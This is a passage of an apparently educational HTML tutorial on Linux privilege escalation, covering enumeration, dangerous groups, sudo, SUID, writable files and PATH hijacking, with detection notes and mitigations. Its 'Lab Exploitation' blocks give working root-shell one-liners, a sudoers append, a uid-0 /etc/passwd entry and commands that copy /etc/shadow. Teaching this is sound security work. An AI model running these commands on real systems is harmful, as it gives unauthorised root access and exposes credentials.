+
+      <div class="mental-model">
+        <div class="title">🧠 Why this matters</div>
+        <p>If you can answer all eight questions with confidence, you understand the vulnerability — not just the exploit command. That's the difference between copy-pasting and actually pentesting.</p>
+      </div>
+    </section>
+
+    <!-- ==================== FUNDAMENTALS ==================== -->
+    <section class="section" id="fundamentals">
+      <h2>📘 Privilege Escalation Fundamentals</h2>
+
+      <h3>What is Privilege Escalation?</h3>
+      <p>Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.</p>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Gaining access to a security principal with more rights than your current one.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Low-priv shells are limited. To read sensitive data, persist, move laterally, or own the host, you need higher privilege.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Find a trusted resource (file, path, service, token) that a privileged process uses and that you can influence.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After initial access and enumeration — when you understand the target well enough to identify a boundary weakness.</p>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <div class="card">
+          <h4>Vertical Escalation</h4>
+          <p>Going from a lower-privileged user to a higher-privileged one. Example: <code>john</code> → <code>root</code> (Linux) or <code>user01</code> → <code>Administrator</code>/<code>SYSTEM</code> (Windows).</p>
+        </div>
+        <div class="card">
+          <h4>Horizontal Escalation</h4>
+          <p>Moving from one user to another user with similar privileges. Example: <code>userA</code> → <code>userB</code> (both normal users). Often used for lateral movement.</p>
+        </div>
+      </div>
+
+      <div class="card">
+        <h4>Local vs Remote</h4>
+        <ul>
+          <li><strong>Local privilege escalation:</strong> You already have a shell on the target and escalate from within.</li>
+          <li><strong>Remote privilege escalation:</strong> Exploiting a network service to gain higher privileges without prior local access.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== ATTACK CHAIN ==================== -->
+    <section class="section" id="attack-chain">
+      <h2>⛓️ Attack Chain</h2>
+      <p>Privilege escalation fits into a typical attack lifecycle:</p>
+      <div class="code-block">
+        <pre>Reconnaissance
+    ↓
+Initial Access
+    ↓
+Execution
+    ↓
+Enumeration
+    ↓
+Privilege Escalation  ← You are here
+    ↓
+Credential Access
+    ↓
+Lateral Movement
+    ↓
+Persistence
+    ↓
+Impact</pre>
+      </div>
+      <p>Real attack paths vary. Sometimes you escalate immediately after initial access; sometimes you move laterally first and escalate later. The key is <strong>enumeration</strong> at every stage.</p>
+    </section>
+
+    <!-- ==================== WORKFLOW ==================== -->
+    <section class="section" id="workflow">
+      <h2>🔄 Enumeration → Exploitation Workflow</h2>
+
+      <div class="section-intro">
+        <strong>Every privilege escalation follows the same workflow.</strong> Standardize your approach and you'll never miss a step.
+      </div>
+
+      <div class="code-block">
+        <pre>ENUMERATE
+    ↓
+IDENTIFY
+    ↓
+HYPOTHESIS
+    ↓
+VALIDATE
+    ↓
+EXPLOIT
+    ↓
+VERIFY PRIVILEGE
+    ↓
+UNDERSTAND ROOT CAUSE
+    ↓
+REMEDIATE</pre>
+      </div>
+
+      <h3>Example: SUID Binary</h3>
+      <div class="code-block">
+        <pre>Found SUID binary
+        ↓
+What does it do? (strings, ltrace, strace)
+        ↓
+Who owns it? (ls -la)
+        ↓
+What does it execute? (system calls, child processes)
+        ↓
+Can I influence that? (PATH, env, input files)
+        ↓
+Is the influence actually privileged? (does root run my code?)
+        ↓
+Can I reproduce it? (test in lab)
+        ↓
+Root obtained? (id)
+        ↓
+Why did it work? (root cause)
+        ↓
+How do we fix it? (remove SUID, fix code, correct perms)</pre>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Never skip steps</div>
+        <p>Skipping "Validate" leads to broken exploits. Skipping "Root Cause" leads to shallow understanding. Skipping "Remediate" makes you a script kiddie, not a pentester.</p>
+      </div>
+    </section>
+
+    <!-- ==================== ENUMERATION ==================== -->
+    <section class="section" id="enumeration">
+      <h2>🔍 Enumeration Methodology</h2>
+
+      <div class="section-intro">
+        <strong>Enumeration is often the most important part of privilege escalation.</strong> The exploit is the last step. Before you can escalate, you must understand what you have, what the system trusts, and where the boundary is weak.
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 The Enumeration Question</div>
+        <p>For every privileged process, ask:</p>
+        <p style="margin-top:0.5rem; font-weight:600; color: var(--accent);">
+          "What does it trust, and can I influence that trust?"
+        </p>
+      </div>
+
+      <div class="card">
+        <h4>What information do I need?</h4>
+        <ol>
+          <li><strong>Identify current user</strong> — Who am I? What can I do?</li>
+          <li><strong>Identify privileges</strong> — sudo rights, tokens, capabilities.</li>
+          <li><strong>Identify OS</strong> — Linux distro, kernel version, Windows build.</li>
+          <li><strong>Identify architecture</strong> — x86, x64, ARM.</li>
+          <li><strong>Identify hostname</strong> — Context and network role.</li>
+          <li><strong>Identify network config</strong> — Interfaces, routes, listening ports.</li>
+          <li><strong>Identify running processes</strong> — What's running as root/SYSTEM?</li>
+          <li><strong>Identify services</strong> — Any writable configs or binaries?</li>
+          <li><strong>Identify scheduled tasks/jobs</strong> — Cron, Task Scheduler.</li>
+          <li><strong>Identify installed software</strong> — Vulnerable versions?</li>
+          <li><strong>Identify files and permissions</strong> — SUID, writable configs, ACLs.</li>
+          <li><strong>Identify credentials/secrets</strong> — Config files, history, registry.</li>
+          <li><strong>Identify misconfigurations</strong> — PATH, LD_PRELOAD, unquoted paths.</li>
+          <li><strong>Identify possible escalation paths</strong> — Correlate findings.</li>
+          <li><strong>Validate safely</strong> — Test in a lab, not on production.</li>
+        </ol>
+      </div>
+
+      <div class="callout warn">
+        <strong>Automated enumeration is a starting point, not a conclusion.</strong> Always manually verify findings. Tools produce false positives.
+      </div>
+    </section>
+
+    <!-- ==================== VULN VS MISCONFIG ==================== -->
+    <section class="section" id="vuln-vs-misconfig">
+      <h2>⚖️ Vulnerability vs Misconfiguration</h2>
+
+      <div class="section-intro">
+        <strong>Not every weakness is a vulnerability.</strong> The remediation, severity, and exploitation approach differ significantly. Learn to distinguish them.
+      </div>
+
+      <table class="vuln-table">
+        <tr><th>Type</th><th>Example</th><th>Remediation approach</th></tr>
+        <tr><td>Misconfiguration</td><td>Weak sudo rule</td><td>Change config, tighten policy</td></tr>
+        <tr><td>Weak permission</td><td>Writable service binary</td><td>Fix ACLs / ownership</td></tr>
+        <tr><td>Design issue</td><td>Dangerous trust relationship</td><td>Redesign, defense in depth</td></tr>
+        <tr><td>Software vulnerability</td><td>Kernel CVE</td><td>Patch / upgrade</td></tr>
+        <tr><td>Credential exposure</td><td>Password in config</td><td>Rotate, protect secrets</td></tr>
+        <tr><td>Logic flaw</td><td>App trusts user input</td><td>Code fix</td></tr>
+      </table>
+
+      <div class="callout warn">
+        <strong>Why this matters:</strong> Calling a misconfiguration a "vulnerability" is inaccurate. It also changes the fix — you don't patch a misconfiguration, you correct it.
+      </div>
+    </section>
+
+    <!-- ==================== LINUX USERS ==================== -->
+    <section class="section" id="linux-users">
+      <h2>🐧 Linux — Users & Groups</h2>
+
+      <div class="section-intro">
+        <strong>Group membership is access.</strong> Being in a group gives you access to resources that group controls. Determine whether that access crosses a privilege boundary.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Your UID, GID, group memberships, and the accounts on the system.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Groups like <code>sudo</code>, <code>docker</code>, <code>lxd</code>, <code>disk</code>, <code>adm</code>, <code>shadow</code>, <code>video</code>, <code>libvirt</code>, <code>systemd-journal</code> provide access to privileged resources.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use <code>id</code>, <code>groups</code>, <code>/etc/passwd</code>, <code>/etc/group</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Always first — before anything else.</p>
+        </div>
+      </div>
+
+      <h3>Dangerous / Interesting Groups</h3>
+      <table>
+        <tr><th>Group</th><th>Why it matters</th><th>Reliability</th></tr>
+        <tr><td><code>sudo</code></td><td>Can run commands as root (per sudoers)</td><td>🟢 Usually direct</td></tr>
+        <tr><td><code>docker</code></td><td>Can mount host filesystem via container</td><td>🟢 Usually direct</td></tr>
+        <tr><td><code>lxd</code> / <code>lxc</code></td><td>Can start privileged containers</td><td>🟢 Usually direct</td></tr>
+        <tr><td><code>disk</code></td><td>Raw disk access — read/write anywhere</td><td>🟢 Usually direct</td></tr>
+        <tr><td><code>adm</code></td><td>Read system logs (may contain secrets)</td><td>🟡 Indirect</td></tr>
+        <tr><td><code>shadow</code></td><td>Read <code>/etc/shadow</code></td><td>🟡 Depends on hash cracking</td></tr>
+        <tr><td><code>video</code></td><td>Access to framebuffer, DRM</td><td>🟡 Environment-dependent</td></tr>
+        <tr><td><code>libvirt</code></td><td>Manage VMs, access to disk images</td><td>🟡 Environment-dependent</td></tr>
+        <tr><td><code>systemd-journal</code></td><td>Read all journal logs</td><td>🟡 Indirect (secrets in logs)</td></tr>
+      </table>
+
+      <div class="callout warn">
+        <strong>Do not say "member of group X = root."</strong> Group membership gives <em>access</em>. You must still determine whether that access crosses a privilege boundary.
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">id</span>                <span class="comment"># Show UID, GID, groups</span>
+<span class="cmd">whoami</span>            <span class="comment"># Current username</span>
+<span class="cmd">groups</span>            <span class="comment"># Groups current user belongs to</span>
+<span class="cmd">w</span>                 <span class="comment"># Who is logged in</span>
+<span class="cmd">last</span>              <span class="comment"># Last logged-in users</span>
+<span class="cmd">cat /etc/passwd</span>   <span class="comment"># User accounts</span>
+<span class="cmd">cat /etc/group</span>    <span class="comment"># Group memberships</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Dangerous Group (docker, lxd, disk)</h5>
+        <p>If you're in the <code>docker</code> group, you can mount the host filesystem inside a container:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+<span class="comment"># Now you're root on the host filesystem</span></pre>
+        </div>
+        <p>If you're in the <code>lxd</code> group:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">lxc image import ./alpine.tar.gz --alias myimage</span>
+<span class="cmd">lxc init myimage mycontainer -c security.privileged=true</span>
+<span class="cmd">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</span>
+<span class="cmd">lxc start mycontainer</span>
+<span class="cmd">lxc exec mycontainer /bin/sh</span></pre>
+        </div>
+        <p>If you're in the <code>disk</code> group:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">debugfs /dev/sda1</span>   <span class="comment"># Or use dd to read /etc/shadow directly</span>
+<span class="cmd">dd if=/dev/sda1 of=/tmp/rootfs.img</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX SUDO ==================== -->
+    <section class="section" id="linux-sudo">
+      <h2>🔑 Linux — Sudo Misconfiguration</h2>
+      <span class="reliability rel-green">🟢 Reliable — usually deterministic</span>
+
+      <div class="section-intro">
+        <strong>Sudo is the most common Linux PrivEsc vector.</strong> If you can run a command as root, you often have a path — either directly or through that command's features.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p><strong>Sudo</strong> allows a permitted user to execute a command as another user (usually root) according to rules in <code>/etc/sudoers</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Many binaries have features (shell escapes, file writes, plugin loading) that let you run arbitrary commands as root even if the binary itself isn't <code>bash</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How to enumerate</span>
+          <p><code>sudo -l</code> lists your allowed commands. Look for <code>NOPASSWD</code>, wildcards, and dangerous binaries.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Immediately after <code>id</code> — it's the fastest potential win.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">sudo -l</span>           <span class="comment"># List allowed sudo commands for current user</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A sudo rule exists for your user<br>
+        <span class="ok">[✓]</span> The allowed binary has a known escape or command exec<br>
+        <span class="ok">[✓]</span> The rule allows running as root (or a privileged user)<br>
+        <span class="ok">[✓]</span> NOPASSWD or you know the password<br>
+        <span class="ok">[✓]</span> No restrictions (wildcards, env_keep, etc.) block the escape<br>
+        <span class="no">[ ]</span> The binary is not a restricted sudo plugin
+      </div>
+
+      <h4>Detection Perspective</h4>
+      <div class="detection-box">
+        <div class="detect-card red">
+          <span class="hdr">🔴 Attacker sees</span>
+          <code>sudo -l</code> output showing a dangerous binary or NOPASSWD rule.
+        </div>
+        <div class="detect-card blue">
+          <span class="hdr">🔵 Defender sees</span>
+          Unusual sudo invocations, especially of editors/shells by non-admins. Audit log entries like <code>sudo: user : TTY=... ; COMMAND=/usr/bin/find</code>.
+        </div>
+        <div class="detect-card green">
+          <span class="hdr">🟢 Mitigation</span>
+          Least privilege. Avoid NOPASSWD for dangerous binaries. Use <code>sudoers.d</code> with tight command paths. Log sudo.
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Common Sudo Binaries</h5>
+        <p>If <code>sudo -l</code> shows you can run any of the following as root (typically with NOPASSWD), these are direct paths to a root shell in a lab. All examples assume the binary is listed in your sudo rights.</p>
+
+        <p><strong>find</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">sudo find . -exec /bin/bash \; -quit</span></pre>
+        </div>
+
+        <p><strong>vim / nano / less / more</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">sudo vim -c ':!/bin/bash'</span>
+<span class="cmd">sudo less /etc/hosts</span>   <span class="comment"># Then type !/bin/bash inside less</span></pre>
+        </div>
+
+        <p><strong>awk / perl / python / ruby / lua</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">sudo awk 'BEGIN {system("/bin/bash")}'</span>
+<span class="cmd">sudo perl -e 'exec "/bin/bash";'</span>
+<span class="cmd">sudo python3 -c 'import os; os.system("/bin/bash")'</span></pre>
+        </div>
+
+        <p><strong>tar / zip / cp / mv / tee</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</span>
+<span class="cmd">echo "user ALL=(root) NOPASSWD: ALL" | sudo tee -a /etc/sudoers</span></pre>
+        </div>
+
+        <p><strong>env / nice / nohup / timeout / xargs / strace / ltrace</strong></p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">sudo env /bin/bash</span>
+<span class="cmd">sudo nice /bin/bash</span>
+<span class="cmd">sudo timeout 1 /bin/bash</span>
+<span class="cmd">sudo xargs -a /dev/null /bin/bash</span></pre>
+        </div>
+
+        <div class="callout warn" style="margin-top:1rem;">
+          <strong>Reference:</strong> GTFOBins (gtfobins.github.io) documents escape sequences for hundreds of binaries. In a lab, use it to find the escape for your specific binary. But remember: understanding <em>why</em> the escape works is more valuable than copying the one-liner.
+        </div>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Mental model for sudo</div>
+        <p>Ask: "Does this binary have a way to <em>run another command</em>, <em>read a file</em>, or <em>write a file</em> as root?" If yes, you likely have escalation.</p>
+      </div>
+
+      <h4>If it doesn't work</h4>
+      <ul>
+        <li>Check if <code>sudo</code> requires a password you don't have.</li>
+        <li>Check if the binary drops privileges or uses secure execution.</li>
+        <li>Check if <code>env_reset</code> or <code>secure_path</code> in sudoers blocks your PATH injection.</li>
+        <li>Check if the sudo version has hardened against that escape.</li>
+      </ul>
+    </section>
+
+    <!-- ==================== LINUX SUID ==================== -->
+    <section class="section" id="linux-suid">
+      <h2>⚙️ Linux — SUID / SGID</h2>
+      <span class="reliability rel-green">🟢 Reliable — if the binary is exploitable</span>
+
+      <div class="section-intro">
+        <strong>SUID is a mechanism, not a vulnerability.</strong> The vulnerability is when a SUID binary can be made to do something the developer didn't intend — usually by controlling its input, environment, or dependencies.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p><strong>SUID (Set User ID):</strong> When executed, runs with the privileges of the file's owner (often root). <strong>SGID:</strong> Same, but group privileges.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If the SUID binary calls another command without a full path, loads a library from a writable location, or trusts environment variables, you can hijack that trust.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How to enumerate</span>
+          <p><code>find / -perm -4000 -type f 2>/dev/null</code> for SUID, <code>-2000</code> for SGID.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After sudo — SUID binaries are a common second look.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>   <span class="comment"># Find SUID binaries</span>
+<span class="cmd">find / -perm -2000 -type f 2>/dev/null</span>   <span class="comment"># Find SGID binaries</span>
+<span class="cmd">ls -la /path/to/binary</span>                    <span class="comment"># Check the 's' in permissions</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> SUID binary exists and is owned by root<br>
+        <span class="ok">[✓]</span> Binary calls another command without absolute path (PATH hijack)<br>
+        <span class="ok">[✓]</span> OR binary loads a shared library from a writable path<br>
+        <span class="ok">[✓]</span> OR binary trusts environment variables (LD_PRELOAD, etc.)<br>
+        <span class="ok">[✓]</span> OR binary has a known escape (GTFOBins)<br>
+        <span class="ok">[✓]</span> OR binary has a memory corruption bug<br>
+        <span class="ok">[✓]</span> Your user can trigger the vulnerable path
+      </div>
+
+      <h4>Detection Perspective</h4>
+      <div class="detection-box">
+        <div class="detect-card red">
+          <span class="hdr">🔴 Attacker sees</span>
+          Unexpected SUID binary in <code>find</code> output, especially in /tmp, /home, or custom paths.
+        </div>
+        <div class="detect-card blue">
+          <span class="hdr">🔵 Defender sees</span>
+          Unusual execution: an interactive shell child process of a SUID binary. File integrity tools (AIDE, Tripwire) flag new SUID bits.
+        </div>
+        <div class="detect-card green">
+          <span class="hdr">🟢 Mitigation</span>
+          Remove unnecessary SUID bits. Monitor SUID binaries. Use <code>nosuid</code> mount option where possible.
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — SUID Binary Abuse</h5>
+        <p>If the SUID binary is a common tool (find, vim, nano, python, etc.), it likely has a GTFOBins escape. In a lab:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Example: SUID find</span>
+<span class="cmd">/usr/bin/find . -exec /bin/bash -p \; -quit</span>
+<span class="comment"># -p preserves privileges when bash starts</span>
+
+<span class="comment"># Example: SUID python</span>
+<span class="cmd">/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span>
+
+<span class="comment"># Example: SUID cp — copy /etc/shadow to a readable location</span>
+<span class="cmd">/usr/bin/cp /etc/shadow /tmp/shadow.txt</span>
+<span class="cmd">cat /tmp/shadow.txt</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — PATH Hijack of a SUID Binary</h5>
+        <p>If the SUID binary calls an external command without an absolute path (e.g., <code>system("cat /etc/shadow")</code>), you can hijack PATH:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Create malicious "cat" in a writable dir</span>
+<span class="cmd">echo '/bin/bash -p' > /tmp/cat</span>
+<span class="cmd">chmod +x /tmp/cat</span>
+<span class="comment"># 2. Prepend to PATH</span>
+<span class="cmd">export PATH=/tmp:$PATH</span>
+<span class="comment"># 3. Trigger the SUID binary</span>
+<span class="cmd">/path/to/vulnerable-suid</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — SUID Binary That Copies Files</h5>
+        <p>If a SUID binary copies files, you can often use it to copy /bin/bash and set SUID on it:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">/path/to/suid-cp /bin/bash /tmp/bash</span>
+<span class="cmd">chmod +s /tmp/bash</span>
+<span class="cmd">/tmp/bash -p</span></pre>
+        </div>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Mental model for SUID</div>
+        <p>Ask: "What does this binary <em>do</em> as root that I could influence?" Look at strings, check what it executes, check what files it reads/writes.</p>
+      </div>
+
+      <h4>If it doesn't work</h4>
+      <ul>
+        <li>The binary uses absolute paths for everything.</li>
+        <li>It drops privileges immediately (setuid/setgid to real UID).</li>
+        <li>It clears environment variables.</li>
+        <li>The kernel ignores LD_PRELOAD for SUID binaries (which it does by default).</li>
+      </ul>
+    </section>
+
+    <!-- ==================== LINUX PERMISSIONS ==================== -->
+    <section class="section" id="linux-perms">
+      <h2>📂 Linux — File Permissions</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Linux permissions: owner, group, other. Read (4), write (2), execute (1).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Writable privileged files (owned by root but writable by you) are a classic escalation path.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>ls -la</code>, <code>find / -writable</code>, <code>stat</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After identifying privileged processes — what files do they trust?</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">ls -la /path/to/file</span>
+<span class="cmd">chmod 755 file</span>      <span class="comment"># rwxr-xr-x</span>
+<span class="cmd">chown user:group file</span>
+<span class="cmd">stat /path/to/file</span>  <span class="comment"># Detailed metadata</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable /etc/passwd</h5>
+        <p>If <code>/etc/passwd</code> is writable, you can add a root-equivalent user:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Generate a password hash</span>
+<span class="cmd">openssl passwd -1 -salt hacked password123</span>
+<span class="comment"># Output: $1$hacked$xxxxxxxxxxxxxxxxxxxxxx</span>
+
+<span class="comment"># 2. Append a new root user</span>
+<span class="cmd">echo 'hacker:$1$hacked$xxxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd</span>
+
+<span class="comment"># 3. Switch to the new user</span>
+<span class="cmd">su hacker</span>   <span class="comment"># password: password123</span>
+<span class="cmd">id</span>          <span class="comment"># uid=0(root) — you are root</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX WRITABLE ==================== -->
+    <section class="section" id="linux-writable">
+      <h2>✏️ Linux — Writable Files & Directories</h2>
+      <span class="reliability rel-yellow">🟡 Environment-dependent — needs a privileged consumer</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Files or directories you can modify that a privileged process also uses.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>If root runs a script you can edit, or reads a config you can modify, you control root's behavior.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>find / -writable -type f 2>/dev/null</code>, <code>find / -writable -type d 2>/dev/null</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After identifying services, cron, or SUID binaries that reference files.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">find / -writable -type f 2>/dev/null | grep -v proc</span>
+<span class="cmd">find / -writable -type d 2>/dev/null</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A privileged process reads/executes this file<br>
+        <span class="ok">[✓]</span> That process runs as root or another privileged user<br>
+        <span class="ok">[✓]</span> You can write to the file or its parent directory<br>
+        <span class="ok">[✓]</span> The process executes after your modification<br>
+        <span class="ok">[✓]</span> The file is not validated by signature/hash
+      </div>
+
+      <div class="callout warn">
+        <strong>Common false positive:</strong> A writable file that no privileged process ever touches. Writable ≠ exploitable.
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable /etc/shadow Backup</h5>
+        <p>If you find a writable backup of /etc/shadow, you can replace root's hash:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Generate new hash</span>
+<span class="cmd">openssl passwd -1 -salt newsalt mynewpassword</span>
+<span class="comment"># 2. Edit the writable shadow backup and replace root's hash</span>
+<span class="comment"># 3. Copy it back if you have write access to /etc/shadow</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LINUX PATH ==================== -->
+    <section class="section" id="linux-path">
+      <h2>🛤️ Linux — PATH Hijacking</h2>
+      <span class="reliability rel-green">🟢 Reliable — if the privileged process respects PATH</span>
+
+      <div class="section-intro">
+        <strong>PATH hijacking</strong> is the classic "trust the lookup" vulnerability. It works because the shell searches directories in order — and if a privileged script relies on that search, you can insert yourself earlier in the list.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p><code>PATH</code> is an environment variable that tells the shell where to look for commands, in order.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why it works</span>
+          <p>If a root script calls <code>cat</code> (no path), the shell searches PATH. If a writable directory is earlier in PATH than <code>/bin</code>, your <code>cat</code> runs as root.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>echo $PATH</code>, then look for writable dirs. In a lab, prepend <code>/tmp</code> and place a malicious binary.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When a privileged process calls a command without an absolute path.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">echo $PATH</span>
+<span class="cmd">export PATH=/tmp:$PATH</span>  <span class="comment"># Add /tmp to front (lab only)</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Privileged process calls an external command by name (no path)<br>
+        <span class="ok">[✓]</span> Your user can write to a directory earlier in PATH than the real command<br>
+        <span class="ok">[✓]</span> The privileged process inherits your PATH or a controllable PATH<br>
+        <span class="ok">[✓]</span> No secure_path restriction applies (sudo usually has one)<br>
+        <span class="no">[ ]</span> The process doesn't use bash -p or a restricted shell
+      </div>
+
+      <h4>Detection Perspective</h4>
+      <div class="detection-box">
+        <div class="detect-card red">
+          <span class="hdr">🔴 Attacker sees</span>
+          <code>$PATH</code> includes writable dirs like <code>/tmp</code>, <code>/home/user/bin</code>, etc.
+        </div>
+        <div class="detect-card blue">
+          <span class="hdr">🔵 Defender sees</span>
+          A process spawned from an unusual path (e.g., <code>/tmp/cat</code>) inheriting root privileges.
+        </div>
+        <div class="detect-card green">
+          <span class="hdr">🟢 Mitigation</span>
+          Use absolute paths in scripts. Use <code>secure_path</code> in sudoers. Don't let privileged processes inherit untrusted PATH.
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — PATH Hijack</h5>
+        <p>Assumes a privileged script or SUID binary calls a command without a full path (e.g., <code>system("cat /etc/shadow")</code>).</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Identify the command being called (e.g., "cat")</span>
+<span class="comment"># 2. Create a fake version in /tmp</span>
+<span class="cmd">echo '/bin/bash -p' > /tmp/cat</span>
+<span class="cmd">chmod +x /tmp/cat</span>
+
+<span class="comment"># 3. Prepend /tmp to PATH</span>
+<span class="cmd">export PATH=/tmp:$PATH</span>
+
+<span class="comment"># 4. Trigger the privileged process</span>
+<span class="cmd">/path/to/vulnerable-binary</span>
+
+<span class="comment"># You should now have a root shell (id → uid=0)</span></pre>
+        </div>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Mental model for PATH hijacking</div>
+        <p>Ask: "Does this privileged script or binary call any command <em>without</em> a full path?" If yes, and you can write to a directory earlier in PATH, you win.</p>
+      </div>
+
+      <h4>If it doesn't work</h4>
+      <ul>
+        <li>Sudo's <code>secure_path</code> resets PATH — you can't inject.</li>
+        <li>The script uses absolute paths.</li>
